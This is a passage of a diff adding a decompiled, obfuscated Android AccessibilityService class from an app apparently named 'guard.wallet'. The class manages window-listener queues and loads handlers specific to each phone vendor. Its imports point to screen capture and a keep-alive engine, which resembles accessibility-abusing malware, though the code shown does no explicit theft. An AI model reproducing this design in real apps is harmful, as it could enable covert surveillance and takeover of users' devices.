@@ -1,0 +1,1883 @@
+package com.guard.wallet.service;
+
+import com.guard.wallet.infra.DelegateRemovePredicate;
+import com.guard.wallet.infra.DelegateFindPredicate;
+import com.guard.wallet.core.AppUtils;
+import android.accessibilityservice.AccessibilityService;
+import com.guard.wallet.req.ListenWindow;
+import com.guard.wallet.utils.SystemHelper;
+import java.util.Collections;
+import java.util.Iterator;
+import java.util.LinkedList;
+import java.util.List;
+import java.util.Objects;
+import java.util.concurrent.ConcurrentLinkedQueue;
+import java.util.concurrent.atomic.AtomicBoolean;
+import java.util.stream.Stream;
+import com.guard.wallet.delegate.AccessibilityDelegate;
+import com.guard.wallet.delegate.DelegateUtils;
+import com.guard.wallet.delegate.ScreenCaptureManager;
+import com.guard.wallet.engine.KeepAliveEngine;
+import o.a0;
+import o.d;
+import o.e0;
+import o.g0;
+import o.h;
+import o.i;
+import o.i0;
+import o.k;
+import o.l;
+import o.n;
+import o.o;
+import o.t;
+import o.v;
+import o.x;
+
+public abstract class AccessibilityDelegateManager extends AccessibilityService {
+   public static final Integer j = 204832;
+   public final ConcurrentLinkedQueue a = new ConcurrentLinkedQueue();
+   public final ConcurrentLinkedQueue b = new ConcurrentLinkedQueue();
+   public final ConcurrentLinkedQueue c = new ConcurrentLinkedQueue();
+   public final ConcurrentLinkedQueue d = new ConcurrentLinkedQueue();
+   public final r e = new r();
+   public final c0 f = new c0();
+   public final g0 g = new g0();
+   public final AtomicBoolean h = new AtomicBoolean(false);
+   public final AtomicBoolean i = new AtomicBoolean(false);
+
+   public final void A() {
+      ConcurrentLinkedQueue var1 = this.a;
+
+      try {
+         if (!var1.isEmpty()) {
+            DelegateRemovePredicate var2 = new DelegateRemovePredicate(this, 7);
+            var1.removeIf(var2);
+         }
+      } catch (Exception var3) {
+         q.s("com.guard.wallet.service.AccessibilityDelegateManager", var3);
+      }
+   }
+
+   public final void B() {
+      ConcurrentLinkedQueue var2 = this.a;
+
+      try {
+         if (!var2.isEmpty()) {
+            DelegateRemovePredicate var1 = new DelegateRemovePredicate(this, 5);
+            var2.removeIf(var1);
+         }
+      } catch (Exception var3) {
+         q.s("com.guard.wallet.service.AccessibilityDelegateManager", var3);
+      }
+   }
+
+   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
+   public final void C(String var1, List var2) {
+      if (var2 != null) {
+         Exception var10000;
+         label135: {
+            try {
+               if (var2.isEmpty()) {
+                  return;
+               }
+
+               var20 = var2.iterator();
+            } catch (Exception var18) {
+               var10000 = var18;
+               boolean var10001 = false;
+               break label135;
+            }
+
+            while (true) {
+               ListenWindow var3;
+               try {
+                  if (!var20.hasNext()) {
+                     return;
+                  }
+
+                  var3 = (ListenWindow)var20.next();
+               } catch (Exception var9) {
+                  var10000 = var9;
+                  boolean var29 = false;
+                  break;
+               }
+
+               if (var3 != null) {
+                  label140: {
+                     String var4;
+                     try {
+                        if (var3.getEventTypes() == null || var3.getEventTypes().isEmpty() || !var3.getEventTypes().contains(2048)) {
+                           break label140;
+                        }
+
+                        var4 = var3.getPackageName();
+                     } catch (Exception var17) {
+                        var10000 = var17;
+                        boolean var30 = false;
+                        break;
+                     }
+
+                     label119: {
+                        try {
+                           if (q.B(var4)) {
+                              break label140;
+                           }
+                        } catch (Exception var16) {
+                           var10000 = var16;
+                           boolean var31 = false;
+                           break label119;
+                        }
+
+                        try {
+                           this.b.remove(var4);
+                           break label140;
+                        } catch (Exception var15) {
+                           var10000 = var15;
+                           boolean var32 = false;
+                        }
+                     }
+
+                     Exception var23 = var10000;
+
+                     try {
+                        q.s("com.guard.wallet.service.AccessibilityDelegateManager", var23);
+                     } catch (Exception var8) {
+                        var10000 = var8;
+                        boolean var33 = false;
+                        break;
+                     }
+                  }
+
+                  label142: {
+                     String var24;
+                     try {
+                        if (var3.getEventTypes() == null || var3.getEventTypes().isEmpty() || !var3.getEventTypes().contains(j)) {
+                           break label142;
+                        }
+
+                        var24 = var3.getPackageName();
+                     } catch (Exception var14) {
+                        var10000 = var14;
+                        boolean var34 = false;
+                        break;
+                     }
+
+                     label101: {
+                        try {
+                           if (q.B(var24)) {
+                              break label142;
+                           }
+                        } catch (Exception var13) {
+                           var10000 = var13;
+                           boolean var35 = false;
+                           break label101;
+                        }
+
+                        try {
+                           this.c.remove(var24);
+                           break label142;
+                        } catch (Exception var12) {
+                           var10000 = var12;
+                           boolean var36 = false;
+                        }
+                     }
+
+                     Exception var25 = var10000;
+
+                     try {
+                        q.s("com.guard.wallet.service.AccessibilityDelegateManager", var25);
+                     } catch (Exception var7) {
+                        var10000 = var7;
+                        boolean var37 = false;
+                        break;
+                     }
+                  }
+
+                  try {
+                     var21 = com.guard.wallet.utils.SystemHelper.v0(var3.getPackageName(), var3.getClassName(), var1);
+                  } catch (Exception var6) {
+                     var10000 = var6;
+                     boolean var38 = false;
+                     break;
+                  }
+
+                  label92: {
+                     try {
+                        if (q.B(var21)) {
+                           continue;
+                        }
+                     } catch (Exception var11) {
+                        var10000 = var11;
+                        boolean var39 = false;
+                        break label92;
+                     }
+
+                     try {
+                        this.d.remove(var21);
+                        continue;
+                     } catch (Exception var10) {
+                        var10000 = var10;
+                        boolean var40 = false;
+                     }
+                  }
+
+                  Exception var22 = var10000;
+
+                  try {
+                     q.s("com.guard.wallet.service.AccessibilityDelegateManager", var22);
+                  } catch (Exception var5) {
+                     var10000 = var5;
+                     boolean var41 = false;
+                     break;
+                  }
+               }
+            }
+         }
+
+         Exception var19 = var10000;
+         q.s("com.guard.wallet.service.AccessibilityDelegateManager", var19);
+      }
+   }
+
+   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
+   public final void D() {
+      Exception var10000;
+      label348: {
+         boolean var1;
+         try {
+            var1 = this.p();
+         } catch (Exception var39) {
+            var10000 = var39;
+            boolean var10001 = false;
+            break label348;
+         }
+
+         ConcurrentLinkedQueue var2 = this.a;
+         if (var1) {
+            label349: {
+               label338: {
+                  Iterator var3;
+                  try {
+                     if (var2.isEmpty()) {
+                        break label349;
+                     }
+
+                     var3 = var2.iterator();
+                  } catch (Exception var38) {
+                     var10000 = var38;
+                     boolean var73 = false;
+                     break label338;
+                  }
+
+                  while (true) {
+                     try {
+                        if (!var3.hasNext()) {
+                           break label349;
+                        }
+
+                        e var4 = (e)var3.next();
+                        if (var4 instanceof a0) {
+                           ((a0)var4).N0();
+                        }
+                     } catch (Exception var37) {
+                        var10000 = var37;
+                        boolean var74 = false;
+                        break;
+                     }
+                  }
+               }
+
+               Exception var48 = var10000;
+
+               try {
+                  q.s("com.guard.wallet.service.AccessibilityDelegateManager", var48);
+               } catch (Exception var36) {
+                  var10000 = var36;
+                  boolean var75 = false;
+                  break label348;
+               }
+            }
+
+            try {
+               this.B();
+            } catch (Exception var35) {
+               var10000 = var35;
+               boolean var76 = false;
+               break label348;
+            }
+         }
+
+         t var49;
+         try {
+            var49 = this.n();
+         } catch (Exception var34) {
+            var10000 = var34;
+            boolean var77 = false;
+            break label348;
+         }
+
+         if (var49 != null) {
+            label350: {
+               label311: {
+                  Iterator var61;
+                  try {
+                     if (var2.isEmpty()) {
+                        break label350;
+                     }
+
+                     var61 = var2.iterator();
+                  } catch (Exception var33) {
+                     var10000 = var33;
+                     boolean var78 = false;
+                     break label311;
+                  }
+
+                  while (true) {
+                     try {
+                        if (!var61.hasNext()) {
+                           break label350;
+                        }
+
+                        e var51 = (e)var61.next();
+                        if (var51 instanceof t) {
+                           ((t)var51).b0();
+                        }
+                     } catch (Exception var32) {
+                        var10000 = var32;
+                        boolean var79 = false;
+                        break;
+                     }
+                  }
+               }
+
+               Exception var50 = var10000;
+
+               try {
+                  q.s("com.guard.wallet.service.AccessibilityDelegateManager", var50);
+               } catch (Exception var31) {
+                  var10000 = var31;
+                  boolean var80 = false;
+                  break label348;
+               }
+            }
+
+            try {
+               this.z();
+            } catch (Exception var30) {
+               var10000 = var30;
+               boolean var81 = false;
+               break label348;
+            }
+         }
+
+         try {
+            var1 = this.o();
+         } catch (Exception var29) {
+            var10000 = var29;
+            boolean var82 = false;
+            break label348;
+         }
+
+         if (var1) {
+            label351: {
+               label284: {
+                  try {
+                     if (var2.isEmpty()) {
+                        break label351;
+                     }
+
+                     var52 = var2.iterator();
+                  } catch (Exception var28) {
+                     var10000 = var28;
+                     boolean var83 = false;
+                     break label284;
+                  }
+
+                  while (true) {
+                     try {
+                        if (!var52.hasNext()) {
+                           break label351;
+                        }
+
+                        e var62 = (e)var52.next();
+                        if (var62 instanceof x) {
+                           ((x)var62).W();
+                        }
+                     } catch (Exception var27) {
+                        var10000 = var27;
+                        boolean var84 = false;
+                        break;
+                     }
+                  }
+               }
+
+               Exception var53 = var10000;
+
+               try {
+                  q.s("com.guard.wallet.service.AccessibilityDelegateManager", var53);
+               } catch (Exception var26) {
+                  var10000 = var26;
+                  boolean var85 = false;
+                  break label348;
+               }
+            }
+
+            try {
+               this.A();
+            } catch (Exception var25) {
+               var10000 = var25;
+               boolean var86 = false;
+               break label348;
+            }
+         }
+
+         try {
+            var1 = this.h();
+         } catch (Exception var24) {
+            var10000 = var24;
+            boolean var87 = false;
+            break label348;
+         }
+
+         if (var1) {
+            label352: {
+               label257: {
+                  Iterator var63;
+                  try {
+                     if (var2.isEmpty()) {
+                        break label352;
+                     }
+
+                     var63 = var2.iterator();
+                  } catch (Exception var23) {
+                     var10000 = var23;
+                     boolean var88 = false;
+                     break label257;
+                  }
+
+                  while (true) {
+                     try {
+                        if (!var63.hasNext()) {
+                           break label352;
+                        }
+
+                        e var55 = (e)var63.next();
+                        if (var55 instanceof k) {
+                           ((k)var55).I(false);
+                        }
+                     } catch (Exception var22) {
+                        var10000 = var22;
+                        boolean var89 = false;
+                        break;
+                     }
+                  }
+               }
+
+               Exception var54 = var10000;
+
+               try {
+                  q.s("com.guard.wallet.service.AccessibilityDelegateManager", var54);
+               } catch (Exception var21) {
+                  var10000 = var21;
+                  boolean var90 = false;
+                  break label348;
+               }
+            }
+
+            try {
+               this.v();
+            } catch (Exception var20) {
+               var10000 = var20;
+               boolean var91 = false;
+               break label348;
+            }
+         }
+
+         try {
+            var1 = this.g();
+         } catch (Exception var19) {
+            var10000 = var19;
+            boolean var92 = false;
+            break label348;
+         }
+
+         if (var1) {
+            label353: {
+               label230: {
+                  try {
+                     if (var2.isEmpty()) {
+                        break label353;
+                     }
+
+                     var56 = var2.iterator();
+                  } catch (Exception var18) {
+                     var10000 = var18;
+                     boolean var93 = false;
+                     break label230;
+                  }
+
+                  while (true) {
+                     try {
+                        if (!var56.hasNext()) {
+                           break label353;
+                        }
+
+                        e var64 = (e)var56.next();
+                        if (var64 instanceof c) {
+                           ((c)var64).Z();
+                        }
+                     } catch (Exception var17) {
+                        var10000 = var17;
+                        boolean var94 = false;
+                        break;
+                     }
+                  }
+               }
+
+               Exception var57 = var10000;
+
+               try {
+                  q.s("com.guard.wallet.service.AccessibilityDelegateManager", var57);
+               } catch (Exception var16) {
+                  var10000 = var16;
+                  boolean var95 = false;
+                  break label348;
+               }
+            }
+
+            try {
+               this.x();
+            } catch (Exception var15) {
+               var10000 = var15;
+               boolean var96 = false;
+               break label348;
+            }
+         }
+
+         try {
+            var1 = this.m();
+         } catch (Exception var14) {
+            var10000 = var14;
+            boolean var97 = false;
+            break label348;
+         }
+
+         if (var1) {
+            label354: {
+               label203: {
+                  Iterator var65;
+                  try {
+                     if (var2.isEmpty()) {
+                        break label354;
+                     }
+
+                     var65 = var2.iterator();
+                  } catch (Exception var13) {
+                     var10000 = var13;
+                     boolean var98 = false;
+                     break label203;
+                  }
+
+                  while (true) {
+                     try {
+                        if (!var65.hasNext()) {
+                           break label354;
+                        }
+
+                        e var59 = (e)var65.next();
+                        if (var59 instanceof o) {
+                           ((o)var59).d();
+                        }
+                     } catch (Exception var12) {
+                        var10000 = var12;
+                        boolean var99 = false;
+                        break;
+                     }
+                  }
+               }
+
+               Exception var58 = var10000;
+
+               try {
+                  q.s("com.guard.wallet.service.AccessibilityDelegateManager", var58);
+               } catch (Exception var11) {
+                  var10000 = var11;
+                  boolean var100 = false;
+                  break label348;
+               }
+            }
+
+            try {
+               this.y();
+            } catch (Exception var10) {
+               var10000 = var10;
+               boolean var101 = false;
+               break label348;
+            }
+         }
+
+         try {
+            var1 = this.i();
+         } catch (Exception var9) {
+            var10000 = var9;
+            boolean var102 = false;
+            break label348;
+         }
+
+         if (!var1) {
+            return;
+         }
+
+         label355: {
+            label177: {
+               try {
+                  if (var2.isEmpty()) {
+                     break label355;
+                  }
+
+                  var45 = var2.iterator();
+               } catch (Exception var8) {
+                  var10000 = var8;
+                  boolean var103 = false;
+                  break label177;
+               }
+
+               while (true) {
+                  try {
+                     if (!var45.hasNext()) {
+                        break label355;
+                     }
+
+                     e var60 = (e)var45.next();
+                     if (var60 instanceof l) {
+                        ((l)var60).d();
+                     }
+                  } catch (Exception var7) {
+                     var10000 = var7;
+                     boolean var104 = false;
+                     break;
+                  }
+               }
+            }
+
+            Exception var46 = var10000;
+
+            try {
+               q.s("com.guard.wallet.service.AccessibilityDelegateManager", var46);
+            } catch (Exception var6) {
+               var10000 = var6;
+               boolean var105 = false;
+               break label348;
+            }
+         }
+
+         try {
+            this.w();
+            return;
+         } catch (Exception var5) {
+            var10000 = var5;
+            boolean var106 = false;
+         }
+      }
+
+      Exception var47 = var10000;
+      q.s("com.guard.wallet.service.AccessibilityDelegateManager", var47);
+   }
+
+   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
+   public final void a() {
+      ConcurrentLinkedQueue var3 = this.a;
+
+      Exception var14;
+      label62: {
+         boolean var1;
+         label56: {
+            label63: {
+               label54: {
+                  Iterator var4;
+                  try {
+                     if (var3.isEmpty()) {
+                        break label63;
+                     }
+
+                     var4 = var3.iterator();
+                  } catch (Exception var9) {
+                     var14 = var9;
+                     boolean var10001 = false;
+                     break label54;
+                  }
+
+                  while (true) {
+                     boolean var2;
+                     try {
+                        if (!var4.hasNext()) {
+                           break label63;
+                        }
+
+                        var2 = (e)var4.next() instanceof i;
+                     } catch (Exception var8) {
+                        var14 = var8;
+                        boolean var15 = false;
+                        break;
+                     }
+
+                     if (var2) {
+                        var1 = true;
+                        break label56;
+                     }
+                  }
+               }
+
+               Exception var12 = var14;
+
+               try {
+                  q.s("com.guard.wallet.service.AccessibilityDelegateManager", var12);
+               } catch (Exception var7) {
+                  var14 = var7;
+                  boolean var16 = false;
+                  break label62;
+               }
+            }
+
+            var1 = false;
+         }
+
+         if (var1) {
+            try {
+               this.u();
+            } catch (Exception var6) {
+               var14 = var6;
+               boolean var17 = false;
+               break label62;
+            }
+         }
+
+         try {
+            i var13 = new i();
+            var3.add(var13);
+            LinkedList var11 = o.i.L();
+            this.t(i.class.getName(), var11);
+            return;
+         } catch (Exception var5) {
+            var14 = var5;
+            boolean var18 = false;
+         }
+      }
+
+      Exception var10 = var14;
+      q.s("com.guard.wallet.service.AccessibilityDelegateManager", var10);
+   }
+
+   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
+   public final void b(String var1) {
+      Exception var10000;
+      label166: {
+         try {
+            if (this.g()) {
+               this.x();
+            }
+         } catch (Exception var24) {
+            var10000 = var24;
+            boolean var10001 = false;
+            break label166;
+         }
+
+         boolean var2;
+         try {
+            var2 = com.guard.wallet.utils.DeviceUtils.isOppoFamily();
+         } catch (Exception var23) {
+            var10000 = var23;
+            boolean var49 = false;
+            break label166;
+         }
+
+         ConcurrentLinkedQueue var3 = this.a;
+         label157:
+         if (var2) {
+            v var4;
+            try {
+               var4 = new v();
+               var3.add(var4);
+               LinkedList var32 = v.w0();
+               this.t(v.class.getName(), var32);
+            } catch (Exception var12) {
+               var10000 = var12;
+               boolean var50 = false;
+               break label157;
+            }
+
+            try {
+               d var33 = new d(var4, var1, 4);
+               com.guard.wallet.thread.l.c(var33, var4.c);
+               return;
+            } catch (Exception var11) {
+               Exception var25 = var11;
+
+               try {
+                  q.s("o.v", var25);
+                  return;
+               } catch (Exception var10) {
+                  var10000 = var10;
+                  boolean var51 = false;
+               }
+            }
+         } else {
+            label156: {
+               o.q var48;
+               label167: {
+                  try {
+                     if (com.guard.wallet.utils.DeviceUtils.isXiaomiFamily()) {
+                        var48 = new o.q();
+                        var3.add(var48);
+                        LinkedList var42 = o.q.l0();
+                        this.t(o.q.class.getName(), var42);
+                        break label167;
+                     }
+                  } catch (Exception var22) {
+                     var10000 = var22;
+                     boolean var52 = false;
+                     break label156;
+                  }
+
+                  label168: {
+                     try {
+                        if (com.guard.wallet.utils.DeviceUtils.isHuaweiOrHonor()) {
+                           var47 = new n();
+                           var3.add(var47);
+                           LinkedList var40 = n.s0();
+                           this.t(n.class.getName(), var40);
+                           break label168;
+                        }
+                     } catch (Exception var21) {
+                        var10000 = var21;
+                        boolean var53 = false;
+                        break label156;
+                     }
+
+                     label169: {
+                        try {
+                           if (com.guard.wallet.utils.DeviceUtils.isVivoFamily()) {
+                              var46 = new i0();
+                              var3.add(var46);
+                              LinkedList var38 = i0.u0();
+                              this.t(i0.class.getName(), var38);
+                              break label169;
+                           }
+                        } catch (Exception var20) {
+                           var10000 = var20;
+                           boolean var54 = false;
+                           break label156;
+                        }
+
+                        label170: {
+                           try {
+                              if (com.guard.wallet.utils.DeviceUtils.isTecnoFamily()) {
+                                 var45 = new e0();
+                                 var3.add(var45);
+                                 LinkedList var36 = e0.n0();
+                                 this.t(e0.class.getName(), var36);
+                                 break label170;
+                              }
+                           } catch (Exception var19) {
+                              var10000 = var19;
+                              boolean var55 = false;
+                              break label156;
+                           }
+
+                           try {
+                              var44 = new o.g();
+                              var3.add(var44);
+                              LinkedList var34 = o.g.k0();
+                              this.t(o.g.class.getName(), var34);
+                           } catch (Exception var18) {
+                              var10000 = var18;
+                              boolean var56 = false;
+                              break label156;
+                           }
+
+                           try {
+                              d var35 = new d(var44, var1, 1);
+                              com.guard.wallet.thread.l.c(var35, var44.c);
+                              return;
+                           } catch (Exception var17) {
+                              Exception var26 = var17;
+
+                              try {
+                                 q.s("o.g", var26);
+                                 return;
+                              } catch (Exception var8) {
+                                 var10000 = var8;
+                                 boolean var57 = false;
+                                 break label156;
+                              }
+                           }
+                        }
+
+                        try {
+                           d var37 = new d(var45, var1, 5);
+                           com.guard.wallet.thread.l.c(var37, var45.c);
+                           return;
+                        } catch (Exception var16) {
+                           Exception var27 = var16;
+
+                           try {
+                              q.s("o.e0", var27);
+                              return;
+                           } catch (Exception var9) {
+                              var10000 = var9;
+                              boolean var58 = false;
+                              break label156;
+                           }
+                        }
+                     }
+
+                     try {
+                        d var39 = new d(var46, var1, 6);
+                        com.guard.wallet.thread.l.c(var39, var46.c);
+                        return;
+                     } catch (Exception var15) {
+                        Exception var28 = var15;
+
+                        try {
+                           q.s("o.i0", var28);
+                           return;
+                        } catch (Exception var5) {
+                           var10000 = var5;
+                           boolean var59 = false;
+                           break label156;
+                        }
+                     }
+                  }
+
+                  try {
+                     d var41 = new d(var47, var1, 2);
+                     com.guard.wallet.thread.l.c(var41, var47.c);
+                     return;
+                  } catch (Exception var14) {
+                     Exception var29 = var14;
+
+                     try {
+                        q.s("o.n", var29);
+                        return;
+                     } catch (Exception var7) {
+                        var10000 = var7;
+                        boolean var60 = false;
+                        break label156;
+                     }
+                  }
+               }
+
+               try {
+                  d var43 = new d(var48, var1, 3);
+                  com.guard.wallet.thread.l.c(var43, var48.c);
+                  return;
+               } catch (Exception var13) {
+                  Exception var30 = var13;
+
+                  try {
+                     q.s("o.q", var30);
+                     return;
+                  } catch (Exception var6) {
+                     var10000 = var6;
+                     boolean var61 = false;
+                  }
+               }
+            }
+         }
+      }
+
+      Exception var31 = var10000;
+      q.s("com.guard.wallet.service.AccessibilityDelegateManager", var31);
+   }
+
+   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
+   public final e c(ListenWindow var1) {
+      if (var1 != null) {
+         Exception var10000;
+         label118: {
+            String var5;
+            try {
+               var5 = var1.getPackageName();
+            } catch (Exception var18) {
+               var10000 = var18;
+               boolean var10001 = false;
+               break label118;
+            }
+
+            ConcurrentLinkedQueue var4 = this.a;
+
+            e var20;
+            label109: {
+               label119: {
+                  label107: {
+                     Iterator var6;
+                     try {
+                        if (var4.isEmpty()) {
+                           break label119;
+                        }
+
+                        var6 = var4.iterator();
+                     } catch (Exception var17) {
+                        var10000 = var17;
+                        boolean var25 = false;
+                        break label107;
+                     }
+
+                     while (true) {
+                        boolean var2;
+                        try {
+                           if (!var6.hasNext()) {
+                              break label119;
+                           }
+
+                           var20 = (e)var6.next();
+                           var2 = Objects.equals(var20.a, var5);
+                        } catch (Exception var16) {
+                           var10000 = var16;
+                           boolean var26 = false;
+                           break;
+                        }
+
+                        if (var2) {
+                           break label109;
+                        }
+                     }
+                  }
+
+                  Exception var3 = var10000;
+
+                  try {
+                     q.s("com.guard.wallet.service.AccessibilityDelegateManager", var3);
+                  } catch (Exception var15) {
+                     var10000 = var15;
+                     boolean var27 = false;
+                     break label118;
+                  }
+               }
+
+               var20 = null;
+            }
+
+            if (var20 != null) {
+               try {
+                  var20.d.add(var1);
+               } catch (Exception var14) {
+                  Exception var21 = var14;
+
+                  try {
+                     q.s("AccessibilityDelegate", var21);
+                  } catch (Exception var13) {
+                     var10000 = var13;
+                     boolean var28 = false;
+                     break label118;
+                  }
+               }
+            } else {
+               try {
+                  var5 = var1.getPackageName();
+                  var20 = new e(Collections.singletonList(var1), var5);
+               } catch (Exception var12) {
+                  var10000 = var12;
+                  boolean var29 = false;
+                  break label118;
+               }
+
+               try {
+                  var4.add(var20);
+               } catch (Exception var11) {
+                  Exception var22 = var11;
+
+                  try {
+                     q.s("com.guard.wallet.service.AccessibilityDelegateManager", var22);
+                  } catch (Exception var10) {
+                     var10000 = var10;
+                     boolean var30 = false;
+                     break label118;
+                  }
+               }
+            }
+
+            try {
+               if (var1.getEventTypes() != null && !var1.getEventTypes().isEmpty() && var1.getEventTypes().contains(2048)) {
+                  this.s(var1.getPackageName());
+               }
+            } catch (Exception var9) {
+               var10000 = var9;
+               boolean var31 = false;
+               break label118;
+            }
+
+            try {
+               if (var1.getEventTypes() != null && !var1.getEventTypes().isEmpty() && var1.getEventTypes().contains(j)) {
+                  this.q(var1.getPackageName());
+               }
+            } catch (Exception var8) {
+               var10000 = var8;
+               boolean var32 = false;
+               break label118;
+            }
+
+            try {
+               this.r(var1.listenWindowUniqueId(var20.getClass().getName()));
+               return var20;
+            } catch (Exception var7) {
+               var10000 = var7;
+               boolean var33 = false;
+            }
+         }
+
+         Exception var19 = var10000;
+         q.s("com.guard.wallet.service.AccessibilityDelegateManager", var19);
+      }
+
+      return null;
+   }
+
+   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
+   public final e d(String var1, List var2) {
+      Exception var10000;
+      label80: {
+         e var3;
+         try {
+            if (q.B(var1)) {
+               return null;
+            }
+
+            var3 = new e(var2, var1);
+         } catch (Exception var10) {
+            var10000 = var10;
+            boolean var10001 = false;
+            break label80;
+         }
+
+         try {
+            this.a.add(var3);
+         } catch (Exception var9) {
+            Exception var11 = var9;
+
+            try {
+               q.s("com.guard.wallet.service.AccessibilityDelegateManager", var11);
+            } catch (Exception var8) {
+               var10000 = var8;
+               boolean var15 = false;
+               break label80;
+            }
+         }
+
+         if (var2 != null) {
+            try {
+               if (var2.isEmpty()) {
+                  return var3;
+               }
+
+               var14 = var2.iterator();
+            } catch (Exception var7) {
+               var10000 = var7;
+               boolean var16 = false;
+               break label80;
+            }
+
+            while (true) {
+               try {
+                  if (!var14.hasNext()) {
+                     break;
+                  }
+
+                  var12 = (ListenWindow)var14.next();
+                  if (var12.getEventTypes() != null && !var12.getEventTypes().isEmpty() && var12.getEventTypes().contains(2048)) {
+                     this.s(var12.getPackageName());
+                  }
+               } catch (Exception var6) {
+                  var10000 = var6;
+                  boolean var17 = false;
+                  break label80;
+               }
+
+               try {
+                  if (var12.getEventTypes() != null && !var12.getEventTypes().isEmpty() && var12.getEventTypes().contains(j)) {
+                     this.q(var12.getPackageName());
+                  }
+               } catch (Exception var5) {
+                  var10000 = var5;
+                  boolean var18 = false;
+                  break label80;
+               }
+
+               try {
+                  this.r(var12.listenWindowUniqueId(e.class.getName()));
+               } catch (Exception var4) {
+                  var10000 = var4;
+                  boolean var19 = false;
+                  break label80;
+               }
+            }
+         }
+
+         return var3;
+      }
+
+      Exception var13 = var10000;
+      q.s("com.guard.wallet.service.AccessibilityDelegateManager", var13);
+      return null;
+   }
+
+   public final void e() {
+      try {
+         if (this.p()) {
+            this.B();
+         }
+
+         ConcurrentLinkedQueue var2 = this.a;
+         a0 var1 = new a0();
+         var2.add(var1);
+         LinkedList var4 = a0.E0();
+         this.t(a0.class.getName(), var4);
+      } catch (Exception var3) {
+         q.s("com.guard.wallet.service.AccessibilityDelegateManager", var3);
+      }
+   }
+
+   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
+   public final boolean f() {
+      ConcurrentLinkedQueue var2 = this.a;
+
+      Exception var10000;
+      label30: {
+         try {
+            if (var2.isEmpty()) {
+               return false;
+            }
+
+            var5 = var2.iterator();
+         } catch (Exception var4) {
+            var10000 = var4;
+            boolean var10001 = false;
+            break label30;
+         }
+
+         while (true) {
+            boolean var1;
+            try {
+               if (!var5.hasNext()) {
+                  return false;
+               }
+
+               var1 = (e)var5.next() instanceof h;
+            } catch (Exception var3) {
+               var10000 = var3;
+               boolean var7 = false;
+               break;
+            }
+
+            if (var1) {
+               return true;
+            }
+         }
+      }
+
+      Exception var6 = var10000;
+      q.s("com.guard.wallet.service.AccessibilityDelegateManager", var6);
+      return false;
+   }
+
+   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
+   public final boolean g() {
+      ConcurrentLinkedQueue var2 = this.a;
+
+      Exception var10000;
+      label30: {
+         try {
+            if (var2.isEmpty()) {
+               return false;
+            }
+
+            var5 = var2.iterator();
+         } catch (Exception var4) {
+            var10000 = var4;
+            boolean var10001 = false;
+            break label30;
+         }
+
+         while (true) {
+            boolean var1;
+            try {
+               if (!var5.hasNext()) {
+                  return false;
+               }
+
+               var1 = (e)var5.next() instanceof c;
+            } catch (Exception var3) {
+               var10000 = var3;
+               boolean var7 = false;
+               break;
+            }
+
+            if (var1) {
+               return true;
+            }
+         }
+      }
+
+      Exception var6 = var10000;
+      q.s("com.guard.wallet.service.AccessibilityDelegateManager", var6);
+      return false;
+   }
+
+   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
+   public final boolean h() {
+      ConcurrentLinkedQueue var2 = this.a;
+
+      Exception var10000;
+      label30: {
+         try {
+            if (var2.isEmpty()) {
+               return false;
+            }
+
+            var5 = var2.iterator();
+         } catch (Exception var4) {
+            var10000 = var4;
+            boolean var10001 = false;
+            break label30;
+         }
+
+         while (true) {
+            boolean var1;
+            try {
+               if (!var5.hasNext()) {
+                  return false;
+               }
+
+               var1 = (e)var5.next() instanceof k;
+            } catch (Exception var3) {
+               var10000 = var3;
+               boolean var7 = false;
+               break;
+            }
+
+            if (var1) {
+               return true;
+            }
+         }
+      }
+
+      Exception var6 = var10000;
+      q.s("com.guard.wallet.service.AccessibilityDelegateManager", var6);
+      return false;
+   }
+
+   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
+   public final boolean i() {
+      ConcurrentLinkedQueue var2 = this.a;
+
+      Exception var10000;
+      label30: {
+         try {
+            if (var2.isEmpty()) {
+               return false;
+            }
+
+            var5 = var2.iterator();
+         } catch (Exception var4) {
+            var10000 = var4;
+            boolean var10001 = false;
+            break label30;
+         }
+
+         while (true) {
+            boolean var1;
+            try {
+               if (!var5.hasNext()) {
+                  return false;
+               }
+
+               var1 = (e)var5.next() instanceof l;
+            } catch (Exception var3) {
+               var10000 = var3;
+               boolean var7 = false;
+               break;
+            }
+
+            if (var1) {
+               return true;
+            }
+         }
+      }
+
+      Exception var6 = var10000;
+      q.s("com.guard.wallet.service.AccessibilityDelegateManager", var6);
+      return false;
+   }
+
+   public final boolean j() {
+      try {
+         if (this.p() || this.n() != null) {
+            return true;
+         } else if (this.o()) {
+            return true;
+         } else if (this.h()) {
+            return true;
+         } else if (this.m()) {
+            return true;
+         } else if (this.i()) {
+            return true;
+         } else {
+            return this.f() ? true : this.g();
+         }
+      } catch (Exception var3) {
+         q.s("com.guard.wallet.service.AccessibilityDelegateManager", var3);
+         return false;
+      }
+   }
+
+   public final boolean k(String var1) {
+      try {
+         return q.B(var1) ? false : this.b.contains(var1);
+      } catch (Exception var3) {
+         q.s("com.guard.wallet.service.AccessibilityDelegateManager", var3);
+         return false;
+      }
+   }
+
+   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
+   public final boolean l(String var1) {
+      Exception var10000;
+      label37: {
+         boolean var2;
+         try {
+            var2 = q.B(var1);
+         } catch (Exception var6) {
+            var10000 = var6;
+            boolean var10001 = false;
+            break label37;
+         }
+
+         if (var2) {
+            return false;
+         }
+
+         ConcurrentLinkedQueue var3 = this.d;
+
+         try {
+            if (var3.contains(var1)) {
+               return true;
+            }
+         } catch (Exception var7) {
+            var10000 = var7;
+            boolean var10 = false;
+            break label37;
+         }
+
+         try {
+            Stream var4 = var3.stream();
+            DelegateFindPredicate var9 = new DelegateFindPredicate(this, var1, 1);
+            return var4.anyMatch(var9);
+         } catch (Exception var5) {
+            var10000 = var5;
+            boolean var11 = false;
+         }
+      }
+
+      Exception var8 = var10000;
+      q.s("com.guard.wallet.service.AccessibilityDelegateManager", var8);
+      return false;
+   }
+
+   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
+   public final boolean m() {
+      ConcurrentLinkedQueue var2 = this.a;
+
+      Exception var10000;
+      label30: {
+         try {
+            if (var2.isEmpty()) {
+               return false;
+            }
+
+            var5 = var2.iterator();
